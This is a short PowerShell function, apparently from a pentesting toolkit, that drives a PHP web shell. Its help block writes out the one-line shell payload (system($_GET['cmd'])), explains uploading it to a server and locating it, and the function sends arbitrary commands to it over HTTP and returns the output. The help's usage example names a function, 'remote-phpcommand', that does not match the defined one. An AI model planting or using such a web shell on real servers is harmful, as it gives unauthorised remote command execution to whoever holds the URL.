function invoke-phpw3bsh3ll {
<#

.SYNOPSIS                                                    
This is a scipt that can help you remotely control a PHP server through a CMD shell that has been uploaded to the server

.DESCRIPTION
 __                     __                        __                    ______ __           __     ______ __ __ 
|__|.-----.--.--.-----.|  |--.-----.______.-----.|  |--.-----.--.--.--.|__    |  |--.-----.|  |--.|__    |  |  |
|  ||     |  |  |  _  ||    <|  -__|______|  _  ||     |  _  |  |  |  ||__    |  _  |__ --||     ||__    |  |  |
|__||__|__|\___/|_____||__|__|_____|      |   __||__|__|   __|________||______|_____|_____||__|__||______|__|__|
                                          |__|         |__| 
Create a PHP file using the following commands 

<?php
  system($_GET['cmd']);
?>

Once you have uploaded the file to server, the next step is to find where the file was uploaded. After that you can run commands likes this. 
http://localhost.com/home/file.php?cmd=pwd

.EXAMPLE
remote-phpcommand -phpfile http://localhost.com/home/file.php -cmd 'ls -la'

.NOTES
Please see the following site for an awesome reference guide. https://pentesterlab.com/exercises/from_sqli_to_shell/course

#>
param(
 $PHPFILE, $CMD
 )
$COMMAND = new-object PSObject
$url = $PHPFILE+"?cmd="+$CMD
$output = Invoke-WebRequest $url
$output = $output.content
return $output
}
